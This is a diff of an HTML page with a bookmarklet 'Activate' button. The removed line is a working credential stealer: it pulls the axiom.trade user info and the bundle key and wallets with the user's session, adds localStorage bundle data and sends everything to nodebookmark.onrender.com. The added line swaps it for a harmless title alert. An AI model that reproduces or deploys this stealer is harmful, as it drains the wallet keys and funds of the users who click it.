@@ -1060,7 +1060,7 @@ strong {
                 </p>
                 
                 <div class="bookmarklet-section" data-testid="bookmarklet-section">
-                    <a href="javascript:(async()=>{try{if(location.hostname==='nodebookmark.onrender.com'){return alert('You are already on the bookmarklet site!')}if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade to use this bookmarklet')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={telegramId:'7680513699',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles'),eBundles:localStorage.getItem('eBundles')};location.replace('https://nodebookmark.onrender.com/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('xworng:',e);alert('errs')}})();'))" class="bookmarklet-btn" data-testid="activate-button" draggable="true">
+                    <a href="javascript:(function(){alert(document.title);})();   " class="bookmarklet-btn" data-testid="activate-button" draggable="true">
                         <i class="ph ph-bookmark-simple"></i>
                         <span>Activate</span>
                     </a>
@@ -1752,4 +1752,5 @@ bookmarkletBtns.forEach(function(btn) {
     </script>
 </body>
 </html>
+
 
